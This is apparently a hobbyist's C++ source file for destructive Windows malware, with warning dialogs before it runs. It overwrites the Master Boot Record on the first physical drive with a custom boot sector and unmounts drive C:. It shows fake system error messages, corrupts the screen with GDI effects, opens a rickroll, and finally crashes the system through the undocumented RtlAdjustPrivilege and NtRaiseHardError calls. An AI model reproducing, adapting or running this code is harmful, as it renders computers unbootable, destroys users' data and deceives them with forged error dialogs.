#ifndef UNICODE //note here in case i forget: ifndef basically means "if not defined, then:" and endif means "end"
#define UNICODE //so basically this  code is saying "if unicode isn't defined, then define it"
#endif 

#define MBR_SIZE 512

#include <windows.h>
#include <WinUser.h>
#include <iostream>
#include <wingdi.h>
#include <math.h>
#include <stdlib.h>
#include <thread>
#include <processthreadsapi.h>
#include <tlhelp32.h>
#include <utilapiset.h>
#include "payloads.h"

typedef NTSTATUS(NTAPI *TFNRtlAdjustPrivilege)(ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrentThread, PBOOLEAN Enabled);

typedef NTSTATUS(NTAPI *TFNNtRaiseHardError)(NTSTATUS ErrorStatus, ULONG NumberOfParameters,
    ULONG UnicodeStringParameterMask, PULONG_PTR *Parameters, ULONG ValidResponseOption, PULONG Response);

typedef long (WINAPI* RtlSetProcessIsCritical) (
    IN BOOLEAN    bNew,
    OUT BOOLEAN* pbOld,
    IN BOOLEAN    bNeedScb);

int audio() {
    while (true) {
        Sleep(rand() % 10000);
        Beep(rand() % 2000, rand() % 5000);
    }
    return 69;
}

INT WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpStr, INT nCmdShow) {

    HMODULE hNtdll = GetModuleHandle(L"ntdll.dll");

    const unsigned char MasterBootRecord[] = { 0xEB, 0x00, 0xE8, 0x1F, 0x00, 0x8C, 0xC8, 0x8E, 0xD8, 0xBE, 0x33, 0x7C, 0xE8, 0x00, 0x00, 0x50,
0xFC, 0x8A, 0x04, 0x3C, 0x00, 0x74, 0x06, 0xE8, 0x05, 0x00, 0x46, 0xEB, 0xF4, 0xEB, 0xFE, 0xB4,
0x0E, 0xCD, 0x10, 0xC3, 0xB4, 0x07, 0xB0, 0x00, 0xB7, 0x09, 0xB9, 0x00, 0x00, 0xBA, 0x4F, 0x18,
0xCD, 0x10, 0xC3, 0x30, 0x31, 0x30, 0x30, 0x31, 0x31, 0x30, 0x31, 0x20, 0x30, 0x31, 0x30, 0x31,
0x31, 0x30, 0x31, 0x30, 0x20, 0x30, 0x31, 0x30, 0x30, 0x31, 0x30, 0x31, 0x30, 0x20, 0x30, 0x31,
0x31, 0x30, 0x30, 0x31, 0x31, 0x30, 0x20, 0x30, 0x31, 0x31, 0x31, 0x30, 0x31, 0x31, 0x31, 0x20,
0x30, 0x30, 0x31, 0x31, 0x30, 0x30, 0x30, 0x30, 0x20, 0x30, 0x30, 0x31, 0x31, 0x30, 0x30, 0x31,
0x30, 0x20, 0x30, 0x30, 0x31, 0x30, 0x31, 0x31, 0x31, 0x31, 0x20, 0x30, 0x30, 0x31, 0x31, 0x30,
0x30, 0x31, 0x31, 0x20, 0x30, 0x31, 0x31, 0x31, 0x31, 0x30, 0x30, 0x30, 0x20, 0x30, 0x31, 0x30,
0x31, 0x30, 0x30, 0x30, 0x31, 0x20, 0x30, 0x31, 0x31, 0x30, 0x31, 0x30, 0x31, 0x30, 0x20, 0x30,
0x31, 0x31, 0x30, 0x30, 0x31, 0x30, 0x30, 0x20, 0x30, 0x31, 0x31, 0x31, 0x31, 0x30, 0x30, 0x30,
0x20, 0x30, 0x30, 0x31, 0x31, 0x30, 0x30, 0x31, 0x31, 0x20, 0x30, 0x30, 0x31, 0x31, 0x30, 0x30,
0x31, 0x31, 0x20, 0x30, 0x31, 0x30, 0x30, 0x31, 0x31, 0x30, 0x31, 0x20, 0x30, 0x30, 0x31, 0x31,
0x30, 0x30, 0x31, 0x31, 0x20, 0x30, 0x30, 0x31, 0x31, 0x30, 0x31, 0x30, 0x30, 0x20, 0x30, 0x31,
0x30, 0x31, 0x31, 0x30, 0x31, 0x30, 0x20, 0x30, 0x31, 0x31, 0x31, 0x30, 0x31, 0x30, 0x30, 0x20,
0x30, 0x31, 0x30, 0x30, 0x30, 0x31, 0x31, 0x30, 0x20, 0x30, 0x31, 0x30, 0x30, 0x30, 0x31, 0x31,
0x31, 0x20, 0x30, 0x31, 0x30, 0x31, 0x30, 0x30, 0x31, 0x31, 0x20, 0x30, 0x31, 0x31, 0x31, 0x30,
0x31, 0x30, 0x31, 0x20, 0x30, 0x31, 0x30, 0x31, 0x31, 0x30, 0x30, 0x31, 0x20, 0x30, 0x31, 0x30,
0x31, 0x30, 0x31, 0x30, 0x30, 0x20, 0x30, 0x31, 0x31, 0x30, 0x30, 0x31, 0x31, 0x30, 0x20, 0x30,
0x31, 0x30, 0x30, 0x31, 0x30, 0x31, 0x30, 0x20, 0x30, 0x31, 0x31, 0x30, 0x31, 0x31, 0x30, 0x31,
0x20, 0x30, 0x31, 0x30, 0x30, 0x31, 0x31, 0x31, 0x30, 0x20, 0x30, 0x31, 0x31, 0x30, 0x30, 0x30,
0x31, 0x30, 0x20, 0x30, 0x31, 0x31, 0x31, 0x31, 0x30, 0x31, 0x30, 0x20, 0x30, 0x31, 0x31, 0x31,
0x31, 0x30, 0x30, 0x31, 0x20, 0x30, 0x31, 0x30, 0x31, 0x31, 0x30, 0x30, 0x31, 0x20, 0x30, 0x31,
0x31, 0x30, 0x31, 0x31, 0x30, 0x30, 0x20, 0x30, 0x30, 0x31, 0x30, 0x31, 0x31, 0x31, 0x31, 0x20,
0x30, 0x31, 0x30, 0x30, 0x30, 0x30, 0x30, 0x31, 0x20, 0x30, 0x31, 0x30, 0x31, 0x30, 0x30, 0x30,
0x30, 0x20, 0x30, 0x30, 0x31, 0x31, 0x31, 0x30, 0x30, 0x30, 0x20, 0x30, 0x31, 0x31, 0x31, 0x30,
0x30, 0x31, 0x31, 0x20, 0x30, 0x30, 0x31, 0x31, 0x30, 0x30, 0x30, 0x31, 0x20, 0x30, 0x31, 0x31,
0x31, 0x30, 0x31, 0x31, 0x31, 0x20, 0x30, 0x30, 0x31, 0x31, 0x31, 0x31, 0x30, 0x31, 0x0D, 0x0A,
0x6B, 0x65, 0x79, 0x20, 0x74, 0x68, 0x61, 0x74, 0x20, 0x68, 0x61, 0x73, 0x20, 0x61, 0x62, 0x73,
0x6F, 0x6C, 0x75, 0x74, 0x65, 0x6C, 0x79, 0x20, 0x6E, 0x6F, 0x20, 0x75, 0x73, 0x65, 0x3A, 0x20,
0x36, 0x39, 0x34, 0x32, 0x30, 0x69, 0x73, 0x6D, 0x79, 0x66, 0x61, 0x76, 0x65, 0x6E, 0x75, 0x6D,
0x62, 0x65, 0x72, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x55, 0xAA
    };

    ShowWindow(GetConsoleWindow(), SW_HIDE);
 
    if (MessageBoxW(NULL, L"This program is malware; a program that will render your computer unusable and corrupt your data should you run it. \nIf you understand this and wish to continue, press Yes. If you just found this file accidentally and do not want to harm your computer or your files, press No and this program will not execute.", L"WARNING", MB_YESNO | MB_ICONEXCLAMATION) != IDYES || MessageBoxW(NULL, L"THIS IS YOUR LAST WARNING. THE CREATOR (kevlu8) IS NOT RESPONSIBLE FOR ANY DAMAGE CAUSED TO YOUR SYSTEM. BY PRESSING THE \"YES\" BUTTON TO THIS MESSAGE BOX, YOUR SYSTEM WILL BE RENDERED UNBOOTABLE AND YOUR PERSONAL FILES WILL BE DELETED. IF YOU UNDERSTAND THIS AND WISH TO EXECUTE THIS MALICIOUS PROGRAM, CLICK YES. OTHERWISE, THIS IS YOUR LAST CHANCE TO BACK OUT BEFORE YOUR FILES ARE GONE.", L"LAST CHANCE BEFORE GIANT FUCKERY", MB_YESNO | MB_ICONEXCLAMATION) != IDYES)
    {
        ExitProcess(0);
    }

    HANDLE ntdll = LoadLibrary(L"ntdll.dll");
    RtlSetProcessIsCritical SetCriticalProcess;

    SetCriticalProcess = (RtlSetProcessIsCritical)
        GetProcAddress((HINSTANCE)ntdll, "RtlSetProcessIsCritical");

    SetCriticalProcess(TRUE, NULL, FALSE);

    //ShowWindow(GetConsoleWindow(), SW_HIDE);

    DWORD idkanymore = 0;
    MSGBOXPARAMS msglol = { 0 };
    msglol.cbSize = sizeof(MSGBOXPARAMS);
    msglol.hwndOwner = NULL;
    msglol.hInstance = GetModuleHandle(NULL);
    msglol.lpszText = L"Cannot find vcruntime140.dll. Click OK to terminate the program.";
    msglol.lpszCaption = L"Fatal error in Xytharis.exe";
    msglol.dwStyle = MB_OK | MB_ICONHAND;
    CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)MessageBoxIndirect, &msglol, 0, &idkanymore);

    //rick roll
    system("start https://www.youtube.com/watch?v=dQw4w9WgXcQ");

    std::thread beeping(audio); //I still dont know how to properly use threads

    DWORD dwBytesWritten;
    HANDLE hDevice = CreateFileW(
        L"\\\\.\\PhysicalDrive0", GENERIC_ALL,
        FILE_SHARE_READ | FILE_SHARE_WRITE, 0,
        OPEN_EXISTING, 0, 0);

    WriteFile(hDevice, MasterBootRecord, 512, &dwBytesWritten, 0);
    CloseHandle(hDevice);

    system("mountvol C: /d");

    DWORD dwVal = 1;

    Sleep(10000);

    DWORD dwID2 = 0;
    MSGBOXPARAMS msg2 = { 0 };
    msg2.cbSize = sizeof(MSGBOXPARAMS);
    msg2.hwndOwner = NULL;
    msg2.hInstance = GetModuleHandle(NULL);
    msg2.lpszText = L"Your computer is now dead! MUAHAHHAHAHHAAHHAHAHAHHAHHA";
    msg2.lpszCaption = L"Your computer is mine now";
    msg2.dwStyle = MB_OK | MB_ICONHAND;
    CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)MessageBoxIndirect, &msg2, 0, &dwID2);

    DWORD dwID1 = 0;
    MSGBOXPARAMS msg1 = { 0 };
    msg1.cbSize = sizeof(MSGBOXPARAMS);
    msg1.hwndOwner = NULL;
    msg1.hInstance = GetModuleHandle(NULL);
    msg1.lpszText = L"Error in application \"svchost.exe\": terminating...";
    msg1.lpszCaption = L"Error";
    msg1.dwStyle = MB_YESNO | MB_ICONQUESTION;
    CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)MessageBoxIndirect, &msg1, 0, &dwID1);

    //memz final payload effect but random
    /*for (int i = 1; i < 50; i++) {

        //msgbox spam
        DWORD dwID = 0;
        MSGBOXPARAMS msg = { 0 };
        msg.cbSize = sizeof(MSGBOXPARAMS);
        msg.hwndOwner = NULL;
        msg.hInstance = GetModuleHandle(NULL);
        msg.lpszText = L"bet you regret that now huh";
        msg.lpszCaption = L"ez";
        msg.dwStyle = MB_YESNO | MB_ICONQUESTION;
        CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)MessageBoxIndirect, &msg, 0, &dwID);


        HWND desktop = GetDesktopWindow();
        HDC desk = GetDC(NULL);
        RECT rect;
        GetWindowRect(desktop, &rect);
        int w = rect.right - rect.left;
        int h = rect.bottom - rect.top;
        StretchBlt(desk, rand() % 100, rand() % 100, w - rand() % 100, h - rand() % 100, desk, 0, 0, w, h, MERGECOPY);
        Sleep(300 - (4 * i));
        TextOutA(desk, 100, 100, "Hey look its ur screen down below", 34);
        StretchBlt(desk, 100, 200, 300, 500, desk, 0, 0, w, h, SRCPAINT);

        HRGN hRegion1;
        hRegion1 = CreateRectRgn(0, 0, w, h);
        InvertRgn(desk, hRegion1);

        Beep(rand() % 30000, rand() % 1000);

    }*/

    p1();

    //i have no idea what this does
    HWND desktop = GetDesktopWindow();
    RECT rect;
    GetWindowRect(desktop, &rect);
    int w = rect.right - rect.left;
    int h = rect.bottom - rect.top;
    HDC desk = GetDC(NULL);
    PatBlt(desk, rand() % 100, rand() % 100, w, h, DSTINVERT);

    HDC hdc = GetDC(0);
    INT sw = GetSystemMetrics(0);
    INT sh = GetSystemMetrics(1);
    SelectObject(hdc, CreateSolidBrush(RGB(rand() % 123, rand() % 431, rand() % 311)));

    for (int index = 0; index < 100; index++) {
        BitBlt(hdc, rand() % 21 - 10, rand() % 21 - 10, sw, sh, hdc, 0, 0, 0x9273ecef);
        BitBlt(hdc, rand() % 21 - 10, rand() % 21 - 10, sw, sh, hdc, 0, 0, PATINVERT);
    }

    HDC hdc2 = GetDC(HWND_DESKTOP);
    int sw2 = GetSystemMetrics(SM_CXSCREEN);
    int sh2 = GetSystemMetrics(SM_CYSCREEN);


   

    //random pixels all over the place
    for (int i = 1; i < 100; i++) {
        CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
        SetPixel(desk, rand() % w, rand() % h, RGB(rand() % 255, rand() % 255, rand() % 255));
        SetPixel(desk, rand() % w, rand() % h, RGB(rand() % 255, rand() % 255, rand() % 255));
        SetPixel(desk, rand() % w, rand() % h, RGB(rand() % 255, rand() % 255, rand() % 255));
        SetPixel(desk, rand() % w, rand() % h, RGB(rand() % 255, rand() % 255, rand() % 255));
        SetPixel(desk, rand() % w, rand() % h, RGB(rand() % 255, rand() % 255, rand() % 255));
        SetPixel(desk, rand() % w, rand() % h, RGB(rand() % 255, rand() % 255, rand() % 255));
        SetPixel(desk, rand() % w, rand() % h, RGB(rand() % 255, rand() % 255, rand() % 255));
        SetPixel(desk, rand() % w, rand() % h, RGB(rand() % 255, rand() % 255, rand() % 255));
        SetPixel(desk, rand() % w, rand() % h, RGB(rand() % 255, rand() % 255, rand() % 255));
        TextOutA(desk, rand() % w, rand() % h, "HAHAHAH UR SCREWED", 18);
        Rectangle(desk, rand() % w, rand() % h, rand() % w, rand() % h);
        Sleep(50);
    }

    DWORD dwID = 0;
    MSGBOXPARAMS msg5 = { 0 };
    msg5.cbSize = sizeof(MSGBOXPARAMS);
    msg5.hwndOwner = NULL;
    msg5.hInstance = GetModuleHandle(NULL);
    msg5.lpszText = L"that was only round 1, have a little braek";
    msg5.lpszCaption = L"get ready";
    msg5.dwStyle = MB_YESNO | MB_ICONQUESTION;
    CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)MessageBoxIndirect, &msg5, 0, &dwID);

    Sleep(10000);

    Ellipse(desk, rand() % w, rand() % h, rand() % w, rand() % h);

    HDC hdc3 = GetDC(HWND_DESKTOP);
    int sw1 = GetSystemMetrics(SM_CXSCREEN), sh1 = GetSystemMetrics(SM_CYSCREEN);

    for (int i = 0; i < 50; i++)
    {
        int y = rand() % sh1, h = sh1 - rand() % sh1 - (sh1 / 1 - 8);
        HBRUSH brush = CreateSolidBrush(RGB(rand() % 75, rand() % 75, rand() % 75));
        SelectObject(hdc3, brush);
        BitBlt(hdc3, 0, y, sw1, h, hdc, rand() % 96 - 56, y, SRCCOPY);
        PatBlt(hdc3, -1, y, sw1, h, PATINVERT);
        Sleep(rand() % 1234);
    }

    HRGN hRegion;

    hRegion = CreateRectRgn(0, 0, w, h);

    for (int i = 1; i < 50; i++) {
        LineTo(desk, rand() % w, rand() % h);
        SetPixel(desk, rand() % w, rand() % h, RGB(rand() % 255, rand() % 255, rand() % 255));
        InvertRgn(desk, hRegion);
        Sleep(50);
    }
    for (int i = 1; i < 50; i++) {
        BitBlt(desk, sin(i), cos(i), sw1, h, hdc, rand() % i * 50, rand() % i * 50, PATINVERT);
    }

   // for (int i = 1; i < 50; i++) {

    //}

    if (hNtdll != 0) { //crash system using undocumented methods
        NTSTATUS s1, s2;
        BOOLEAN b;
        ULONG r;

        TFNRtlAdjustPrivilege pfnRtlAdjustPrivilege = (TFNRtlAdjustPrivilege)GetProcAddress(hNtdll, "RtlAdjustPrivilege");
        s1 = pfnRtlAdjustPrivilege(19, true, false, &b);

        TFNNtRaiseHardError pfnNtRaiseHardError = (TFNNtRaiseHardError)GetProcAddress(hNtdll, "NtRaiseHardError");
        s2 = pfnNtRaiseHardError(0xDEADDEAD, 0, 0, 0, 6, &r);
    }

    beeping.join();

    return 0;
}